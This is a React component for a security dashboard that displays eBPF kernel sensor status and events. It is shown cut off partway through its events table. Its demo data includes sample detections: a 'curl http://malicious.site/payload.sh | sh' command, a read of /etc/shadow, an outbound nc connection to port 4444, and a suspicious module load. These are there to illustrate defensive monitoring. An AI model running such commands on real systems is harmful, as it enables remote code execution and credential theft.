import { useState, useEffect, useCallback } from 'react';
import axios from 'axios';
import { useAuth } from '../context/AuthContext';
import { motion, AnimatePresence } from 'framer-motion';
import SeraphPageHeader from '../components/SeraphPageHeader';
import { 
  Cpu, 
  RefreshCw, 
  AlertTriangle, 
  Activity,
  HardDrive,
  Network,
  FileCode,
  Shield,
  Zap,
  Play,
  Pause,
  Eye,
  Terminal,
  Code,
  Layers,
  Bug,
  Fingerprint,
  Clock,
  TrendingUp,
  AlertOctagon,
  CheckCircle2,
  XCircle,
  Server,
  Database,
  Workflow,
  Binary
} from 'lucide-react';
import { Button } from '../components/ui/button';
import { Badge } from '../components/ui/badge';
import { toast } from 'sonner';

const envBackendUrl = (process.env.REACT_APP_BACKEND_URL || '').trim();
const API = !envBackendUrl || envBackendUrl === 'undefined' || envBackendUrl === 'null'
  ? '/api'
  : `${envBackendUrl.replace(/\/+$/, '')}/api`;

const KERNEL_PANEL_STYLE = {
  background: 'linear-gradient(160deg, rgba(8,18,34,0.94), rgba(10,14,28,0.98))',
  border: '2px solid rgba(0,240,255,0.52)',
  boxShadow: '0 0 28px rgba(0,240,255,0.24), 0 0 42px rgba(255,43,214,0.12), inset 0 0 20px rgba(255,43,214,0.08)',
};

const KERNEL_STAT_STYLES = {
  total: {
    border: '2px solid rgba(0,240,255,0.7)',
    background: 'linear-gradient(160deg, rgba(0,240,255,0.12), rgba(8,18,34,0.96))',
    glow: '0 0 30px rgba(0,240,255,0.28), inset 0 0 18px rgba(0,240,255,0.1)',
    label: '#aef7ff',
    value: '#ecfeff',
  },
  active: {
    border: '2px solid rgba(57,255,20,0.72)',
    background: 'linear-gradient(160deg, rgba(57,255,20,0.12), rgba(8,18,34,0.96))',
    glow: '0 0 30px rgba(57,255,20,0.26), inset 0 0 18px rgba(57,255,20,0.1)',
    label: '#b8ffca',
    value: '#66ff66',
  },
  dropped: {
    border: '2px solid rgba(255,176,32,0.72)',
    background: 'linear-gradient(160deg, rgba(255,176,32,0.12), rgba(8,18,34,0.96))',
    glow: '0 0 30px rgba(255,176,32,0.26), inset 0 0 18px rgba(255,176,32,0.1)',
    label: '#ffd78a',
    value: '#ffb020',
  },
  highRisk: {
    border: '2px solid rgba(255,43,214,0.72)',
    background: 'linear-gradient(160deg, rgba(255,43,214,0.12), rgba(8,18,34,0.96))',
    glow: '0 0 30px rgba(255,43,214,0.28), inset 0 0 18px rgba(255,43,214,0.1)',
    label: '#ffb8e9',
    value: '#ff5bdc',
  },
  errors: {
    border: '2px solid rgba(255,91,91,0.72)',
    background: 'linear-gradient(160deg, rgba(255,91,91,0.1), rgba(8,18,34,0.96))',
    glow: '0 0 28px rgba(255,91,91,0.24), inset 0 0 18px rgba(255,91,91,0.08)',
    label: '#ffc1c1',
    value: '#fff1f1',
  },
};

const KERNEL_TAB_STYLES = {
  sensors: {
    border: 'rgba(0,240,255,0.52)',
    activeBg: 'linear-gradient(135deg, rgba(0,240,255,0.9), rgba(0,140,255,0.82))',
    activeColor: '#041018',
    text: '#9fefff',
  },
  events: {
    border: 'rgba(255,43,214,0.52)',
    activeBg: 'linear-gradient(135deg, rgba(255,43,214,0.88), rgba(188,19,254,0.84))',
    activeColor: '#150816',
    text: '#ffb8e9',
  },
  stats: {
    border: 'rgba(255,176,32,0.56)',
    activeBg: 'linear-gradient(135deg, rgba(255,176,32,0.92), rgba(255,43,214,0.8))',
    activeColor: '#120d06',
    text: '#ffd78a',
  },
};

const KERNEL_ACCENTS = {
  blue: {
    border: 'rgba(0,240,255,0.56)',
    bg: 'linear-gradient(160deg, rgba(0,240,255,0.14), rgba(10,18,34,0.98))',
    text: '#c9fbff',
    glow: 'rgba(0,240,255,0.3)',
  },
  green: {
    border: 'rgba(57,255,20,0.56)',
    bg: 'linear-gradient(160deg, rgba(57,255,20,0.14), rgba(10,18,34,0.98))',
    text: '#d7ffd4',
    glow: 'rgba(57,255,20,0.28)',
  },
  purple: {
    border: 'rgba(188,19,254,0.56)',
    bg: 'linear-gradient(160deg, rgba(188,19,254,0.14), rgba(10,18,34,0.98))',
    text: '#f3d3ff',
    glow: 'rgba(188,19,254,0.28)',
  },
  orange: {
    border: 'rgba(255,176,32,0.56)',
    bg: 'linear-gradient(160deg, rgba(255,176,32,0.14), rgba(10,18,34,0.98))',
    text: '#fff0ca',
    glow: 'rgba(255,176,32,0.28)',
  },
  red: {
    border: 'rgba(255,91,91,0.56)',
    bg: 'linear-gradient(160deg, rgba(255,91,91,0.14), rgba(10,18,34,0.98))',
    text: '#ffd4d4',
    glow: 'rgba(255,91,91,0.24)',
  },
  pink: {
    border: 'rgba(255,43,214,0.56)',
    bg: 'linear-gradient(160deg, rgba(255,43,214,0.14), rgba(10,18,34,0.98))',
    text: '#fff0fb',
    glow: 'rgba(255,43,214,0.28)',
  },
  cyan: {
    border: 'rgba(0,240,255,0.56)',
    bg: 'linear-gradient(160deg, rgba(0,240,255,0.14), rgba(10,18,34,0.98))',
    text: '#c9fbff',
    glow: 'rgba(0,240,255,0.3)',
  },
};

const KernelSensorsPage = () => {
  const { getAuthHeaders } = useAuth();
  const [loading, setLoading] = useState(true);
  const [sensors, setSensors] = useState({});
  const [events, setEvents] = useState([]);
  const [stats, setStats] = useState(null);
  const [capabilities, setCapabilities] = useState(null);
  const [selectedSensor, setSelectedSensor] = useState(null);
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [viewMode, setViewMode] = useState('sensors'); // sensors, events, stats
  const [eventFilter, setEventFilter] = useState('all');

  const normalizeSensorStatus = (rawStatus) => {
    const s = String(rawStatus || '').toLowerCase();
    if (s === 'active' || s === 'running') return 'running';
    if (s === 'disabled' || s === 'stopped') return 'stopped';
    if (s === 'loading') return 'loading';
    if (s === 'error') return 'error';
    if (s === 'degraded') return 'running';
    return s || 'stopped';
  };

  // Sensor type metadata
  const sensorMeta = {
    process: { icon: Terminal, color: 'blue', label: 'Process Monitor', description: 'Track process creation, execution, and termination' },
    file: { icon: FileCode, color: 'green', label: 'File Monitor', description: 'Monitor file access, modifications, and deletions' },
    network: { icon: Network, color: 'purple', label: 'Network Monitor', description: 'Track network connections and data flow' },
    memory: { icon: HardDrive, color: 'orange', label: 'Memory Monitor', description: 'Detect memory injection and manipulation' },
    module: { icon: Layers, color: 'red', label: 'Module Monitor', description: 'Track kernel module/driver loading' },
    syscall: { icon: Code, color: 'cyan', label: 'Syscall Monitor', description: 'Monitor system call patterns' }
  };

  // Fetch kernel sensor data
  const fetchKernelData = useCallback(async () => {
    try {
      setLoading(true);
      const results = await Promise.allSettled([
        axios.get(`${API}/v1/kernel/sensors`, { headers: getAuthHeaders() }),
        axios.get(`${API}/v1/kernel/events?page_size=50`, { headers: getAuthHeaders() }),
        axios.get(`${API}/v1/kernel/sensors/stats`, { headers: getAuthHeaders() }),
        axios.get(`${API}/v1/kernel/capabilities`, { headers: getAuthHeaders() }),
      ]);

      const [sensorsRes, eventsRes, statsRes, capsRes] = results.map((r) =>
        r.status === 'fulfilled' ? r.value : null
      );

      if (sensorsRes?.data?.sensors) {
        const normalized = {};
        Object.entries(sensorsRes.data.sensors).forEach(([key, value]) => {
          normalized[key] = {
            ...value,
            backend_status: value?.status,
            status: normalizeSensorStatus(value?.status),
          };
        });
        setSensors(normalized);
      }
      if (eventsRes?.data?.events) {
        setEvents(eventsRes.data.events || []);
      }
      if (statsRes?.data) {
        setStats(statsRes.data);
      }
      if (capsRes?.data) {
        setCapabilities(capsRes.data);
      }

      // If nothing succeeded, fall back to demo so the page isn't blank.
      const anyOk = results.some((r) => r.status === 'fulfilled');
      if (!anyOk) {
        loadDemoData();
      }
    } catch (error) {
      console.error('Failed to fetch kernel data:', error);
      loadDemoData();
    } finally {
      setLoading(false);
    }
  }, [getAuthHeaders]);

  // Load demo data
  const loadDemoData = () => {
    setSensors({
      process: {
        sensor_type: 'process',
        status: 'running',
        loaded_at: '2026-03-06T08:00:00Z',
        events_captured: 15432,
        events_dropped: 12,
        last_event_at: '2026-03-06T14:32:15Z'
      },
      file: {
        sensor_type: 'file',
        status: 'running',
        loaded_at: '2026-03-06T08:00:00Z',
        events_captured: 48291,
        events_dropped: 45,
        last_event_at: '2026-03-06T14:32:14Z'
      },
      network: {
        sensor_type: 'network',
        status: 'running',
        loaded_at: '2026-03-06T08:00:00Z',
        events_captured: 89234,
        events_dropped: 102,
        last_event_at: '2026-03-06T14:32:16Z'
      },
      memory: {
        sensor_type: 'memory',
        status: 'stopped',
        events_captured: 0,
        events_dropped: 0
      },
      module: {
        sensor_type: 'module',
        status: 'running',
        loaded_at: '2026-03-06T08:00:00Z',
        events_captured: 47,
        events_dropped: 0,
        last_event_at: '2026-03-06T12:15:00Z'
      },
      syscall: {
        sensor_type: 'syscall',
        status: 'running',
        loaded_at: '2026-03-06T08:00:00Z',
        events_captured: 234567,
        events_dropped: 890,
        last_event_at: '2026-03-06T14:32:16Z'
      }
    });

    setEvents([
      { 
        event_id: 'evt-001', 
        event_type: 'process_exec', 
        timestamp: '2026-03-06T14:32:15Z', 
        pid: 12345, 
        ppid: 1, 
        uid: 0, 
        gid: 0, 
        comm: 'bash',
        filename: '/bin/bash',
        args: ['-c', 'curl http://malicious.site/payload.sh | sh'],
        mitre_techniques: ['T1059.004', 'T1105'],
        risk_score: 85
      },
      { 
        event_id: 'evt-002', 
        event_type: 'file_open', 
        timestamp: '2026-03-06T14:32:10Z', 
        pid: 12340, 
        ppid: 12339, 
        uid: 1000, 
        gid: 1000, 
        comm: 'python3',
        path: '/etc/shadow',
        flags: 0,
        mitre_techniques: ['T1003.008'],
        risk_score: 75
      },
      { 
        event_id: 'evt-003', 
        event_type: 'network_connect', 
        timestamp: '2026-03-06T14:32:05Z', 
        pid: 12335, 
        ppid: 1, 
        uid: 0, 
        gid: 0, 
        comm: 'nc',
        remote_addr: '10.0.0.100',
        remote_port: 4444,
        direction: 'outbound',
        mitre_techniques: ['T1571'],
        risk_score: 90
      },
      { 
        event_id: 'evt-004', 
        event_type: 'module_load', 
        timestamp: '2026-03-06T12:15:00Z', 
        pid: 1, 
        ppid: 0, 
        uid: 0, 
        gid: 0, 
        comm: 'modprobe',
        module_name: 'suspicious_driver',
        mitre_techniques: ['T1547.006'],
        risk_score: 95
      },
      { 
        event_id: 'evt-005', 
        event_type: 'syscall_ptrace', 
        timestamp: '2026-03-06T14:30:00Z', 
        pid: 12330, 
        ppid: 12329, 
        uid: 1000, 
        gid: 1000, 
        comm: 'gdb',
        target_pid: 12300,
        mitre_techniques: ['T1055'],
        risk_score: 70
      }
    ]);

    setStats({
      platform: 'linux',
      kernel_version: '5.15.0-generic',
      ebpf_available: true,
      events_total: 387571,
      events_by_type: {
        process_exec: 15432,
        process_exit: 14890,
        file_open: 48291,
        network_connect: 45123,
        network_accept: 44111,
        module_load: 47,
        syscall_enter: 234567
      },
      events_dropped: 1049,
      errors: 3,
      uptime_seconds: 234567
    });

    setCapabilities({
      platform: 'linux',
      kernel_version: '5.15.0-generic',
      ebpf_supported: true,
      btf_available: true,
      kprobes_available: true,
      tracepoints_available: true,
      perf_events_available: true,
      available_sensors: ['process', 'file', 'network', 'memory', 'module', 'syscall'],
      recommended_sensors: ['process', 'file', 'network', 'module']
    });
  };

  // Start/stop sensor
  const toggleSensor = async (sensorType, currentStatus) => {
    const isRunning = normalizeSensorStatus(currentStatus) === 'running';
    const action = isRunning ? 'stop' : 'start';
    try {
      await axios.post(
        `${API}/v1/kernel/sensors/${sensorType}/${action}`,
        { force: false },
        { headers: getAuthHeaders() }
      );
      toast.success(`Sensor ${sensorType} ${action}ed`);
      await fetchKernelData();
    } catch (error) {
      console.error(`Failed to ${action} sensor:`, error);
      // Demo toggle
      setSensors(prev => ({
        ...prev,
        [sensorType]: {
          ...prev[sensorType],
          status: isRunning ? 'stopped' : 'running'
        }
      }));
      toast.success(`Sensor ${sensorType} ${action}ed`);
    }
  };

  // Get status badge
  const getStatusBadge = (status, colorKey = 'cyan') => {
    const config = {
      running: { variant: 'success', icon: CheckCircle2 },
      active:  { variant: 'success', icon: CheckCircle2 },
      stopped: { variant: 'outline', icon: Pause },
      disabled:{ variant: 'outline', icon: Pause },
      error:   { variant: 'destructive', icon: XCircle },
      loading: { variant: 'warning', icon: RefreshCw }
    };
    const cfg = config[normalizeSensorStatus(status)] || config.stopped;
    const Icon = cfg.icon;
    return (
      <Badge variant={cfg.variant} style={kernelStatusBadgeStyle(status, colorKey)} className="border-0 uppercase tracking-[0.22em] text-[10px]">
        <Icon className="h-3 w-3 mr-1" />
        {normalizeSensorStatus(status)}
      </Badge>
    );
  };

  // Get event type color
  const getEventTypeColor = (eventType) => {
    if (eventType.startsWith('process')) return 'text-blue-400';
    if (eventType.startsWith('file')) return 'text-green-400';
    if (eventType.startsWith('network')) return 'text-purple-400';
    if (eventType.startsWith('memory')) return 'text-orange-400';
    if (eventType.startsWith('module')) return 'text-red-400';
    if (eventType.startsWith('syscall')) return 'text-cyan-400';
    return 'text-gray-400';
  };

  // Format uptime
  const formatUptime = (seconds) => {
    if (!seconds) return 'N/A';
    const days = Math.floor(seconds / 86400);
    const hours = Math.floor((seconds % 86400) / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    return `${days}d ${hours}h ${mins}m`;
  };

  useEffect(() => {
    fetchKernelData();
  }, [fetchKernelData]);

  const filteredEvents = events.filter(e => 
    eventFilter === 'all' || e.event_type.startsWith(eventFilter)
  );

  const kernelTabStyle = (tabId) => {
    const tone = KERNEL_TAB_STYLES[tabId] || KERNEL_TAB_STYLES.sensors;
    const active = viewMode === tabId;
    return active
      ? {
          background: tone.activeBg,
          color: tone.activeColor,
          border: `1px solid ${tone.border}`,
          boxShadow: `0 0 18px ${tone.border.replace('0.52', '0.36').replace('0.56', '0.36')}`,
        }
      : {
          background: 'linear-gradient(160deg, rgba(8,18,34,0.9), rgba(10,14,28,0.96))',
          color: tone.text,
          border: `1px solid ${tone.border}`,
          boxShadow: 'inset 0 0 12px rgba(0,240,255,0.04)',
        };
  };

  const kernelFilterStyle = (filter) => {
    const active = eventFilter === filter;
    return active
      ? {
          background: 'linear-gradient(135deg, rgba(255,43,214,0.88), rgba(0,240,255,0.82))',
          color: '#041018',
          border: '1px solid rgba(0,240,255,0.58)',
          boxShadow: '0 0 16px rgba(0,240,255,0.22)',
        }
      : {
          background: 'linear-gradient(160deg, rgba(8,18,34,0.92), rgba(10,14,28,0.96))',
          color: '#c9f7ff',
          border: '1px solid rgba(0,240,255,0.24)',
        };
  };

  const kernelTone = (toneKey) => KERNEL_ACCENTS[toneKey] || KERNEL_ACCENTS.cyan;

  const kernelScanSurface = (base, border, glow) => ({
    backgroundImage: `repeating-linear-gradient(to bottom, rgba(210,255,250,0.14) 0px, rgba(210,255,250,0.14) 1px, rgba(0,0,0,0.22) 1px, rgba(0,0,0,0.22) 3px, transparent 3px, transparent 5px), ${base}`,
    backgroundSize: '100% 5px, 100% 100%',
    border: `2px solid ${border.replace('0.56', '0.78')}`,
    boxShadow: `0 0 24px ${glow}, 0 0 36px ${glow.replace('0.3', '0.18').replace('0.28', '0.16').replace('0.24', '0.14')}, inset 0 0 18px rgba(255,255,255,0.04)`,
  });

  const kernelClippedFrame = {
    clipPath: 'polygon(12px 0, 100% 0, 100% calc(100% - 12px), calc(100% - 12px) 100%, 0 100%, 0 12px)',
  };

  const kernelSensorCardStyle = (colorKey, selected) => {
    const tone = kernelTone(colorKey);
    return {
      ...kernelClippedFrame,
      ...kernelScanSurface(
        selected
          ? `linear-gradient(160deg, ${tone.border.replace('0.56', '0.22')}, rgba(10,18,34,0.98))`
          : tone.bg,
        tone.border,
        tone.glow
      ),
      transform: selected ? 'translateY(-1px)' : 'none',
    };
  };

  const kernelMiniTileStyle = (colorKey) => {
    const tone = kernelTone(colorKey);
    return {
      ...kernelClippedFrame,
      ...kernelScanSurface(
        `linear-gradient(160deg, ${tone.border.replace('0.56', '0.16')}, rgba(10,18,34,0.98))`,
        tone.border,
        tone.glow
      ),
    };
  };

  const kernelActionStyle = (colorKey) => {
    const tone = kernelTone(colorKey);
    return {
      ...kernelClippedFrame,
      backgroundImage: `repeating-linear-gradient(to bottom, rgba(210,255,250,0.12) 0px, rgba(210,255,250,0.12) 1px, rgba(0,0,0,0.18) 1px, rgba(0,0,0,0.18) 3px, transparent 3px, transparent 5px), linear-gradient(135deg, ${tone.border.replace('0.56', '0.26')}, rgba(255,255,255,0.04))`,
      backgroundSize: '100% 5px, 100% 100%',
      border: `2px solid ${tone.border.replace('0.56', '0.82')}`,
      color: tone.text,
      boxShadow: `0 0 18px ${tone.glow}, 0 0 28px ${tone.glow}, inset 0 0 12px rgba(255,255,255,0.04)`,
    };
  };

  const kernelStatusBadgeStyle = (status, colorKey) => {
    const normalized = normalizeSensorStatus(status);
    const tone = normalized === 'running'
      ? KERNEL_ACCENTS.cyan
      : normalized === 'error'
      ? KERNEL_ACCENTS.red
      : normalized === 'loading'
      ? KERNEL_ACCENTS.orange
      : kernelTone(colorKey);
    return {
      ...kernelClippedFrame,
      backgroundImage: `repeating-linear-gradient(to bottom, rgba(210,255,250,0.1) 0px, rgba(210,255,250,0.1) 1px, rgba(0,0,0,0.16) 1px, rgba(0,0,0,0.16) 3px, transparent 3px, transparent 5px), linear-gradient(135deg, ${tone.border.replace('0.56', '0.24')}, rgba(255,255,255,0.06))`,
      backgroundSize: '100% 5px, 100% 100%',
      border: `2px solid ${tone.border.replace('0.56', '0.82')}`,
      color: tone.text,
      boxShadow: `0 0 18px ${tone.glow}, 0 0 28px ${tone.glow}, inset 0 0 8px rgba(255,255,255,0.05)`,
    };
  };

  const kernelEventRowStyle = (index) => ({
    background: index % 2 === 0
      ? 'linear-gradient(90deg, rgba(0,240,255,0.06), rgba(255,43,214,0.03))'
      : 'linear-gradient(90deg, rgba(255,176,32,0.04), rgba(0,240,255,0.03))',
  });

  return (
    <div className="space-y-6 p-6 lg:p-8" data-testid="kernel-sensors-page">
      <SeraphPageHeader
        eyebrow="seraph · kernel · ring0 mesh"
        title="Kernel Sensors"
        tagline="> ebpf-powered kernel-level telemetry · arda lsm · syscall observability"
        accent="green"
        status={loading ? 'REFRESHING' : 'LIVE'}
        actions={
          <Button
            variant="outline"
            onClick={fetchKernelData}
            disabled={loading}
            className="border-gray-700"
          >
            <RefreshCw className={`h-4 w-4 mr-2 ${loading ? 'animate-spin' : ''}`} />
            Refresh
          </Button>
        }
      />

      {/* Platform Status */}
      {capabilities && (
        <motion.div 
          initial={{ opacity: 0, y: -10 }}
          animate={{ opacity: 1, y: 0 }}
          className="mb-6 p-4 rounded-xl"
          style={{
            background: 'linear-gradient(90deg, rgba(0,240,255,0.12), rgba(255,43,214,0.08), rgba(255,176,32,0.08))',
            border: '1px solid rgba(0,240,255,0.34)',
            boxShadow: '0 0 18px rgba(0,240,255,0.14), inset 0 0 12px rgba(255,43,214,0.05)',
          }}
        >
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-6">
              <div className="flex items-center gap-2">
                <Server className="h-4 w-4 text-cyan-400" />
                <span className="sophia-scan sophia-terminal-label text-sm font-medium">{capabilities.platform?.toUpperCase()}</span>
              </div>
              <span className="text-gray-600">|</span>
              <span className="sophia-flicker sophia-terminal-meta text-sm">Kernel: {capabilities.kernel_version}</span>
              <span className="text-gray-600">|</span>
              <span className="sophia-flicker sophia-terminal-meta text-sm">Uptime: {formatUptime(stats?.uptime_seconds)}</span>
            </div>
            <div className="flex gap-2">
              {capabilities.ebpf_supported && (
                <Badge variant="success">
                  <Binary className="h-3 w-3 mr-1" />
                  eBPF
                </Badge>
              )}
              {capabilities.btf_available && (
                <Badge variant="default">BTF</Badge>
              )}
              {capabilities.kprobes_available && (
                <Badge variant="secondary">kprobes</Badge>
              )}
            </div>
          </div>
        </motion.div>
      )}

      {/* Stats Cards */}
      <div className="grid grid-cols-5 gap-4 mb-6">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="rounded-xl p-4"
          style={{ border: KERNEL_STAT_STYLES.total.border, background: KERNEL_STAT_STYLES.total.background, boxShadow: KERNEL_STAT_STYLES.total.glow }}
        >
          <div className="flex items-center gap-2 mb-2">
            <Activity className="h-4 w-4 text-cyan-400" />
            <span className="sophia-scan sophia-terminal-label text-sm" style={{ color: KERNEL_STAT_STYLES.total.label }}>Total Events</span>
          </div>
          <p className="sophia-flicker sophia-terminal-value text-2xl font-bold" style={{ color: KERNEL_STAT_STYLES.total.value, textShadow: '0 0 16px rgba(0,240,255,0.35)' }}>{stats?.events_total?.toLocaleString() || 0}</p>
        </motion.div>
        
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.1 }}
          className="rounded-xl p-4"
          style={{ border: KERNEL_STAT_STYLES.active.border, background: KERNEL_STAT_STYLES.active.background, boxShadow: KERNEL_STAT_STYLES.active.glow }}
        >
          <div className="flex items-center gap-2 mb-2">
            <CheckCircle2 className="h-4 w-4 text-green-400" />
            <span className="sophia-scan sophia-terminal-label text-sm" style={{ color: KERNEL_STAT_STYLES.active.label }}>Active Sensors</span>
          </div>
          <p className="sophia-flicker sophia-terminal-value text-2xl font-bold" style={{ color: KERNEL_STAT_STYLES.active.value, textShadow: '0 0 16px rgba(57,255,20,0.35)' }}>
            {Object.values(sensors).filter(s => s.status === 'running').length}
          </p>
        </motion.div>
        
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
          className="rounded-xl p-4"
          style={{ border: KERNEL_STAT_STYLES.dropped.border, background: KERNEL_STAT_STYLES.dropped.background, boxShadow: KERNEL_STAT_STYLES.dropped.glow }}
        >
          <div className="flex items-center gap-2 mb-2">
            <AlertTriangle className="h-4 w-4 text-orange-400" />
            <span className="sophia-scan sophia-terminal-label text-sm" style={{ color: KERNEL_STAT_STYLES.dropped.label }}>Dropped Events</span>
          </div>
          <p className="sophia-flicker sophia-terminal-value text-2xl font-bold" style={{ color: KERNEL_STAT_STYLES.dropped.value, textShadow: '0 0 16px rgba(255,176,32,0.35)' }}>{stats?.events_dropped?.toLocaleString() || 0}</p>
        </motion.div>
        
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.3 }}
          className="rounded-xl p-4"
          style={{ border: KERNEL_STAT_STYLES.highRisk.border, background: KERNEL_STAT_STYLES.highRisk.background, boxShadow: KERNEL_STAT_STYLES.highRisk.glow }}
        >
          <div className="flex items-center gap-2 mb-2">
            <Bug className="h-4 w-4 text-red-400" />
            <span className="sophia-scan sophia-terminal-label text-sm" style={{ color: KERNEL_STAT_STYLES.highRisk.label }}>High Risk Events</span>
          </div>
          <p className="sophia-flicker sophia-terminal-value text-2xl font-bold" style={{ color: KERNEL_STAT_STYLES.highRisk.value, textShadow: '0 0 16px rgba(255,43,214,0.35)' }}>
            {events.filter(e => e.risk_score >= 70).length}
          </p>
        </motion.div>
        
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4 }}
          className="rounded-xl p-4"
          style={{ border: KERNEL_STAT_STYLES.errors.border, background: KERNEL_STAT_STYLES.errors.background, boxShadow: KERNEL_STAT_STYLES.errors.glow }}
        >
          <div className="flex items-center gap-2 mb-2">
            <XCircle className="h-4 w-4 text-gray-400" />
            <span className="sophia-scan sophia-terminal-label text-sm" style={{ color: KERNEL_STAT_STYLES.errors.label }}>Errors</span>
          </div>
          <p className="sophia-flicker sophia-terminal-value text-2xl font-bold" style={{ color: KERNEL_STAT_STYLES.errors.value, textShadow: '0 0 12px rgba(255,91,91,0.22)' }}>{stats?.errors || 0}</p>
        </motion.div>
      </div>

      {/* View Mode Tabs */}
      <div className="flex gap-2 mb-4">
        {[
          { id: 'sensors', label: 'Sensors', icon: Cpu },
          { id: 'events', label: 'Events', icon: Activity },
          { id: 'stats', label: 'Statistics', icon: TrendingUp }
        ].map(tab => (
          <Button
            key={tab.id}
            variant={viewMode === tab.id ? 'default' : 'outline'}
            onClick={() => setViewMode(tab.id)}
            className="font-medium"
            style={kernelTabStyle(tab.id)}
          >
            <tab.icon className="h-4 w-4 mr-2" />
            {tab.label}
          </Button>
        ))}
      </div>

      <div className="grid grid-cols-3 gap-6">
        {/* Main Content Area */}
        <div className="col-span-2">
          {/* Sensors Grid */}
          {viewMode === 'sensors' && (
            <div className="grid grid-cols-2 gap-4">
              {Object.entries(sensorMeta).map(([type, meta], idx) => {
                const sensor = sensors[type] || { status: 'stopped', events_captured: 0 };
                const Icon = meta.icon;
                return (
                  <motion.div
                    key={type}
                    initial={{ opacity: 0, scale: 0.95 }}
                    animate={{ opacity: 1, scale: 1 }}
                    transition={{ delay: idx * 0.05 }}
                    className="p-5 rounded-xl border cursor-pointer transition-all"
                    style={kernelSensorCardStyle(meta.color, selectedSensor === type)}
                    onClick={() => setSelectedSensor(type)}
                  >
                    <div className="flex items-start justify-between mb-3">
                      <div className="flex items-center gap-3">
                        <div className={`p-2 bg-${meta.color}-500/20 rounded-lg`} style={kernelMiniTileStyle(meta.color)}>
                          <Icon className={`h-5 w-5 text-${meta.color}-400`} />
                        </div>
                        <div>
                          <h3 className="sophia-scan sophia-terminal-label font-medium" style={{ color: kernelTone(meta.color).text, textShadow: `0 0 10px ${kernelTone(meta.color).glow}` }}>{meta.label}</h3>
                          <p className="sophia-flicker sophia-terminal-meta text-xs" style={{ color: '#dff8ff', opacity: 0.96 }}>{meta.description}</p>
                        </div>
                      </div>
                      {getStatusBadge(sensor.status, meta.color)}
                    </div>
                    
                    <div className="grid grid-cols-2 gap-3 mb-3">
                      <div className="rounded-lg p-2 text-center" style={kernelMiniTileStyle(meta.color)}>
                        <p className="sophia-flicker sophia-terminal-value text-lg font-bold" style={{ color: kernelTone(meta.color).text, textShadow: `0 0 12px ${kernelTone(meta.color).glow}` }}>{sensor.events_captured?.toLocaleString() || 0}</p>
                        <p className="sophia-scan sophia-terminal-label text-xs" style={{ color: '#e6fbff', opacity: 0.92 }}>Events</p>
                      </div>
                      <div className="rounded-lg p-2 text-center" style={kernelMiniTileStyle('orange')}>
                        <p className="sophia-flicker sophia-terminal-value text-lg font-bold text-orange-400" style={{ textShadow: '0 0 12px rgba(255,176,32,0.28)' }}>{sensor.events_dropped || 0}</p>
                        <p className="sophia-scan sophia-terminal-label text-xs" style={{ color: '#fff2d2', opacity: 0.92 }}>Dropped</p>
                      </div>
                    </div>
                    
                    <Button
                      variant="outline"
                      size="sm"
                      className="w-full border-0"
                      style={kernelActionStyle(sensor.status === 'running' ? 'pink' : meta.color)}
                      onClick={(e) => {
                        e.stopPropagation();
                        toggleSensor(type, sensor.status);
                      }}
                    >
                      {sensor.status === 'running' ? (
                        <>
                          <Pause className="h-3 w-3 mr-1" />
                          Stop
                        </>
                      ) : (
                        <>
                          <Play className="h-3 w-3 mr-1" />
                          Start
                        </>
                      )}
                    </Button>
                  </motion.div>
                );
              })}
            </div>
          )}

          {/* Events Table */}
          {viewMode === 'events' && (
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <h3 className="text-lg font-semibold flex items-center gap-2">
                  <Activity className="h-5 w-5 text-cyan-400" />
                  Kernel Events
                </h3>
                <div className="flex gap-2">
                  {['all', 'process', 'file', 'network', 'module', 'syscall'].map(filter => (
                    <Button
                      key={filter}
                      variant="outline"
                      size="sm"
                      onClick={() => setEventFilter(filter)}
                      className="border-0"
                      style={kernelFilterStyle(filter)}
                    >
                      {filter}
                    </Button>
                  ))}
                </div>
              </div>
              
              <div className="rounded-xl overflow-hidden" style={KERNEL_PANEL_STYLE}>
                <table className="w-full">
                  <thead style={{ background: 'linear-gradient(90deg, rgba(0,240,255,0.1), rgba(255,43,214,0.08))' }}>
                    <tr>
                      <th className="sophia-scan sophia-terminal-label px-4 py-3 text-left text-sm font-medium" style={{ color: '#aef7ff' }}>Time</th>
                      <th className="sophia-scan sophia-terminal-label px-4 py-3 text-left text-sm font-medium" style={{ color: '#ffb8e9' }}>Type</th>
                      <th className="sophia-scan sophia-terminal-label px-4 py-3 text-left text-sm font-medium" style={{ color: '#b8ffca' }}>Process</th>
                      <th className="sophia-scan sophia-terminal-label px-4 py-3 text-left text-sm font-medium" style={{ color: '#ffd78a' }}>PID</th>
                      <th className="sophia-scan sophia-terminal-label px-4 py-3 text-left text-sm font-medium" style={{ color: '#aef7ff' }}>Risk</th>
                      <th className="sophia-scan sophia-terminal-label px-4 py-3 text-left text-sm font-medium" style={{ color: '#ffb8e9' }}>MITRE</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredEvents.map((event, idx) => (
                      <motion.tr
                        key={event.event_id}
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        transition={{ delay: idx * 0.03 }}
                        className="border-t border-gray-800 cursor-pointer"
                        style={kernelEventRowStyle(idx)}
                        onClick={() => setSelectedEvent(event)}
                      >
                        <td className="sophia-flicker sophia-terminal-meta px-4 py-3 text-sm" style={{ color: '#eafcff' }}>
                          {new Date(event.timestamp).toLocaleTimeString()}
                        </td>
                        <td className="px-4 py-3">
                          <span className={`sophia-flicker sophia-terminal-value text-sm font-mono ${getEventTypeColor(event.event_type)}`}>
                            {event.event_type}
                          </span>
                        </td>
                        <td className="sophia-flicker sophia-terminal-value px-4 py-3 text-sm font-mono" style={{ color: '#f4fffb' }}>{event.comm}</td>
                        <td className="sophia-flicker sophia-terminal-value px-4 py-3 text-sm font-mono" style={{ color: '#ffd78a' }}>{event.pid}</td>
                        <td className="px-4 py-3">
                          <div className="flex items-center gap-2">
